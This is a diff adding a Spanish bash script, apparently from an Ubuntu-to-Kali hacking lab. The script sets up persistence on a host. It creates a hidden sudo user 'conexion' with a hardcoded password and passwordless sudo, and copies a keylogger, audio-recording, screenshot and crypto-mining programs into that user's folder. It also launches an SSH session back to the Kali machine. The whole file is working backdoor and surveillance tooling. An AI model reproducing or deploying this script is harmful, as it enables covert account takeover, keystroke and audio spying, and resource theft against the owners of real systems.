@@ -1,0 +1,87 @@
+chmod +x /home/ubuntu_20_04/Descargas*
+
+# Verificar si el usuario 'conexion' ya ha sido creado
+if id "conexion" &>/dev/null; then
+    echo "El usuario 'conexion' ya existe."
+
+    # Verificacion de ficheros existentes
+    if [ ! -f /home/conexion/Descargas/sesion_ssh ]; then
+        echo "El fichero sesion_ssh no existe. Copiando desde /home/ubuntu_20_04/Descargas"
+        sudo cp /home/ubuntu_20_04/Descargas/sesion_ssh /home/conexion/Descargas/
+        sudo chown conexion:conexion /home/conexion/Descargas/sesion_ssh
+    else
+    	echo "El fichero 'sesion_ssh' ya existe."
+    fi
+    
+    if [ ! -f /home/conexion/Descargas/keylogger.py ]; then
+        echo "El fichero keylogger.py no existe. Copiando desde /home/ubuntu_20_04/Descargas"
+        sudo cp /home/ubuntu_20_04/Descargas/keylogger.py /home/conexion/Descargas/
+        sudo chown conexion:conexion /home/conexion/Descargas/keylogger.py
+    else
+    	echo "El fichero 'keylogger.py' ya existe."
+    fi
+    
+    if [ ! -f /home/conexion/Descargas/dependencias ]; then
+        echo "El fichero dependencias no existe. Copiando desde /home/ubuntu_20_04/dependencias"
+        sudo cp /home/ubuntu_20_04/Descargas/dependencias /home/conexion/Descargas/
+        sudo chown conexion:conexion /home/conexion/Descargas/dependencias
+    else
+    	echo "El fichero 'dependencias' ya existe."
+    fi
+    
+    if [ ! -f /home/conexion/Descargas/grabacion_audio ]; then
+        echo "El fichero grabacion_audio no existe. Copiando desde /home/ubuntu_20_04/grabacion_audio"
+        sudo cp /home/ubuntu_20_04/Descargas/grabacion_audio /home/conexion/Descargas/
+        sudo chown conexion:conexion /home/conexion/Descargas/grabacion_audio
+    else
+    	echo "El fichero 'grabacion_audio' ya existe."
+    fi
+    
+    if [ ! -f /home/conexion/Descargas/capturas_pantalla ]; then
+        echo "El fichero 'capturas_pantalla' no existe. Copiando desde /home/ubuntu_20_04/capturas_pantalla"
+        sudo cp /home/ubuntu_20_04/Descargas/capturas_pantalla /home/conexion/Descargas/
+        sudo chown conexion:conexion /home/conexion/Descargas/capturas_pantalla
+    else
+    	echo "El fichero 'capturas_pantalla' ya existe."
+    fi
+    
+    if [ ! -f /home/conexion/Descargas/cripto_minado ]; then
+        echo "El fichero 'cripto_minado' no existe. Copiando desde /home/ubuntu_20_04/cripto_minado"
+        sudo cp /home/ubuntu_20_04/Descargas/cripto_minado /home/conexion/Descargas/
+        sudo chown conexion:conexion /home/conexion/Descargas/cripto_minado
+    else
+    	echo "El fichero 'cripto_minado' ya existe."
+    fi
+    
+else
+    # Crear el usuario 'conexion' con los mismos permisos que root
+    echo "Usuario 'conexion' no existe. Creando"
+    sudo useradd -m -G sudo -s /bin/bash conexion
+    echo "Usuario 'conexion' creado."
+
+    # Establecer una contraseña para el usuario 'conexion'
+    echo "conexion:ubuntu" | sudo chpasswd
+
+    # Permitir que el usuario 'conexion' use sudo sin contraseña
+    echo "conexion ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/conexion > /dev/null
+    echo "Copiando ficheros de hacking de /home/ubuntu_20_04/Descargas a /home/conexion/Descargas."
+    sudo cp -r /home/ubuntu_20_04/Descargas /home/conexion/Descargas
+    sudo chown -R conexion:conexion /home/conexion/Descargas
+    mkdir Música
+    sudo chown -R conexion:conexion /home/conexion/Música
+    mkdir Imágenes
+    sudo chown -R conexion:conexion /home/conexion/Imágenes
+fi
+
+# Función para verificar si el proceso está en ejecución
+verificar_proceso() {
+    if ! pgrep -u conexion "sesion_ssh" > /dev/null; then
+        echo -e "\nSSH Ubuntu-Kali inactivo. Activando\n"
+        sudo -u conexion bash -c 'cd /home/ubuntu_20_04/Descargas && ./sesion_ssh'
+    else
+        echo "Conexion entre Ubuntu y Kali ya establecida"
+    fi
+}
+
+# Ejecutar la verificación del proceso
+verificar_proceso
